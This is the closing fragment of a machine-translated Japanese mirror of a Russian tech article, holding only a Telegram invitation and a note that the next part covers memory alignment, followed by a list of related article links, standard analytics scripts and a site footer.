<img src="https://habrastorage.org/webt/a3/bg/eb/a3bgeb13bwvby4__w5dahqlsbtk.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
あなたは私たちに参加することができます</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">電報</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">次回は、alignメモリを扱います。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja462457/index.html">Maltegoの4つのリリース。仕事と機会の原則</a></li>
<li><a href="../ja462459/index.html">CC2531を使用してHomebridgeにZigBeeデバイスを追加する</a></li>
<li><a href="../ja462461/index.html">GOES-17衝突調査結果</a></li>
<li><a href="../ja462465/index.html">Appleのネイティブプレースの使用</a></li>
<li><a href="../ja462469/index.html">「エンタープライズ」タスクのためのRでの並行コンピューティングに関するいくつかの考慮事項</a></li>
<li><a href="../ja462473/index.html">マイクロサービスを使用するための環境を開発しています。パート1ベアメタルへのKubernetes HAのインストール（Debian）</a></li>
<li><a href="../ja462475/index.html">Алексей Савватеев: Как бороться с коррупцией при помощи математики (Нобелевская премия по экономике за 2016 год)</a></li>
<li><a href="../ja462477/index.html">科学者はAIを新しい特許の作成者であると主張し、特許法を変更しようとしています</a></li>
<li><a href="../ja462479/index.html">Steam Windowsクライアントローカル権限エスカレーション0day</a></li>
<li><a href="../ja462481/index.html">タイプシステムFAQ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>